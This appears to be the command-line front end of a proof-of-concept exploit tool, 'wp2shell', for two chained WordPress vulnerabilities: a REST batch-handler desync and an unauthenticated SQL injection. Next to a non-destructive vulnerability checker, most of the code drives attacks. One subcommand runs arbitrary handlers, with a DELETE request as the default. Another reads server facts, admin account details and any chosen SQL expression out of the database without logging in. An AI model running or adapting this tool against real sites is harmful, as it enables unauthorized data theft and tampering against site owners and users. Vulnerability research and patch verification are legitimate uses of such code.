"""wp2shell — unified CLI for CVE-2026-63030 + CVE-2026-60137 research.

Subcommands:
  check   non-destructive detector (VULNERABLE / PATCHED / INCONCLUSIVE)
  sqli    unauthenticated blind/UNION SQLi via the nested batch
  probe   confirm the desync via the handler-substitution signal
  seat    run an arbitrary target handler via the desync

AUTHORIZATION: run only against systems you own or are explicitly authorized to
test, on an isolated network. See AUTHORIZATION.md.
"""

import argparse
import json
import sys

from . import desync, sqli
from .http import endpoints


def _resolve(base):
    url = desync.working_endpoint(base)
    if not url:
        print("[!] batch/v1 not reachable at", base, file=sys.stderr)
        sys.exit(2)
    return url


# ── check ───────────────────────────────────────────────────────────────────
def cmd_check(args):
    verdict, codes = "INCONCLUSIVE", None
    for url in endpoints(args.target):
        verdict, codes = desync.detect(url)
        if verdict != "INCONCLUSIVE" or codes:
            break
    if args.json:
        print(json.dumps({"target": args.target, "verdict": verdict, "codes": codes}, indent=2))
    else:
        print(f"[*] target : {args.target}")
        print(f"[*] req[1] categories -> {codes[1] if codes and len(codes) > 1 else '?'}")
        if verdict == "VULNERABLE":
            print("[+] VULNERABLE — handler desync present (CVE-2026-63030).")
            print("    Remediation: update WordPress core to >= 7.0.2 / >= 6.9.5.")
        elif verdict == "PATCHED":
            print("[-] NOT VULNERABLE — correct handler adjudicated the request.")
        else:
            print("[?] INCONCLUSIVE — batch/v1 unreachable, not WordPress, or altered upstream.")
    return {"VULNERABLE": 1, "PATCHED": 0}.get(verdict, 2)


# ── probe ───────────────────────────────────────────────────────────────────
def cmd_probe(args):
    url = _resolve(args.target)
    print(f"[*] endpoint: {url}")
    present = desync.desync_present(url)
    if present:
        print("[+] VULNERABLE: block-renderer's gate judged a posts DELETE (desync active).")
    else:
        print("[-] PATCHED: donor judged by its own handler.")
    return 1 if present else 0


# ── seat ────────────────────────────────────────────────────────────────────
def cmd_seat(args):
    url = _resolve(args.target)
    donor = {"method": args.donor_method, "path": args.donor_path}
    if args.donor_body:
        donor["body"] = json.loads(args.donor_body)
    target = {"method": args.target_method, "path": args.target_path}
    print(f"[*] layout: [malformed x{args.k}, DONOR {donor['method']} {donor['path']}, "
          f"TARGET {target['method']} {target['path']}]")
    _, responses, donor_resp = desync.seat(url, target, donor, k=args.k,
                                           cookies=args.cookie, nonce=args.nonce)
    print(json.dumps(responses, indent=2)[:4000])
    print("\n[*] executed-handler response (H fed the donor request):")
    print(json.dumps(donor_resp, indent=2)[:2000])
    return 0


# ── sqli ────────────────────────────────────────────────────────────────────
def cmd_sqli(args):
    url = _resolve(args.target)
    print("[*] Unauthenticated SQLi (CVE-2026-60137) via nested-batch desync (CVE-2026-63030)")
    mode, extract = sqli.choose_extractor(url, args.maxlen)
    if mode == "union":
        print("[+] UNION extraction working (one request/value, no published post required).")
    elif mode == "blind":
        print("[+] boolean-blind fallback (needs >=1 published post).")
    else:
        if desync.desync_present(url):
            print("[!] 63030 desync present, but the SQLi did not fire — CVE-2026-60137 likely patched")
            print("    (WP_Query uses wp_parse_id_list, neutralizing the author_exclude string).")
        else:
            print("[!] no desync signal — target appears PATCHED (63030 closed) or batch/v1 altered.")
        return 2

    if args.expr:
        print(f"    {args.expr} = {extract(args.expr)}")
        return 0
    prefix = sqli.detect_prefix(extract) or args.prefix
    print(f"[+] table prefix: {prefix!r}")
    for label, expr in sqli.SERVER_FACTS + sqli.admin_facts(prefix):
        print(f"    {label:13s}: {extract(expr)}")
    return 0


def build_parser():
    ap = argparse.ArgumentParser(
        prog="wp2shell",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="CVE-2026-63030 + CVE-2026-60137 research PoC (authorized testing only).",
        epilog=(
            "command groups:\n"
            "  assessment (use these against an authorized target):\n"
            "    check   is the target vulnerable? (non-destructive)\n"
            "    sqli    unauthenticated DB read via the clean-core chain\n"
            "  research (raw desync primitives):\n"
            "    probe   confirm the desync signal\n"
            "    seat    drive the desync primitive directly\n"))
    sub = ap.add_subparsers(dest="cmd", required=True)

    c = sub.add_parser("check", help="[assessment] non-destructive detector")
    c.add_argument("target")
    c.add_argument("--json", action="store_true")
    c.set_defaults(func=cmd_check)

    p = sub.add_parser("probe", help="[research] confirm the desync via handler-substitution signal")
    p.add_argument("target")
    p.set_defaults(func=cmd_probe)

    s = sub.add_parser("seat", help="[research] run an arbitrary target handler via the desync")
    s.add_argument("target")
    s.add_argument("--donor-method", default="DELETE")
    s.add_argument("--donor-path", default="/wp/v2/posts/0")
    s.add_argument("--donor-body", help="JSON dict delivered to the drifted handler")
    s.add_argument("--target-method", required=True)
    s.add_argument("--target-path", required=True)
    s.add_argument("--k", type=int, default=1, help="leading malformed count (drift)")
    s.add_argument("--cookie")
    s.add_argument("--nonce")
    s.set_defaults(func=cmd_seat)

    sq = sub.add_parser("sqli", help="[assessment] unauthenticated SQLi via nested batch (60137 + 63030)")
    sq.add_argument("target")
    sq.add_argument("--expr", help="custom SQL scalar expression to extract")
    sq.add_argument("--prefix", default="wp_", help="DB table prefix fallback (default wp_)")
    sq.add_argument("--maxlen", type=int, default=48, help="max chars per value (blind mode)")
    sq.set_defaults(func=cmd_sqli)

    return ap


def main(argv=None):
    args = build_parser().parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
